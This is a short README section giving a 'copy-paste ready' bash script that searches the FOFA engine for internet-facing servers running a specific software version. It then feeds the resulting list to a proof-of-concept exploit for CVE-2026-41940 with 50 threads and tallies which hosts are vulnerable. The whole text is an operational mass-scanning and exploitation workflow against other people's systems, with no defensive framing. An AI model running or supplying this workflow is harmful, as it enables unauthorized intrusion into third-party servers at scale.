## 🚀 FULL WORKFLOW (Copy-Paste Ready)

```bash
#!/bin/bash

# Setup (change these!)
FOFA_EMAIL="your@email.com"
FOFA_KEY="your_fofa_api_key"
OUTPUT="targets.txt"

# Step 1: Search FOFA
echo "[*] Step 1: Searching FOFA..."
python3 dork-generator-api.py \
  -p fofa \
  -e $FOFA_EMAIL \
  -k $FOFA_KEY \
  -v 11.126.0 \
  -o $OUTPUT

# Step 2: Run exploit
echo "[*] Step 2: Running exploit..."
python3 POC_CVE-2026-41940.py -l $OUTPUT -t 50 -o results.json

# Step 3: Show results
echo "[*] Step 3: Results"
echo "[+] Total servers: $(wc -l < $OUTPUT)"
echo "[+] Vulnerable: $(grep '"vuln": true' results.json | wc -l)"

echo "[+] Done!"
```

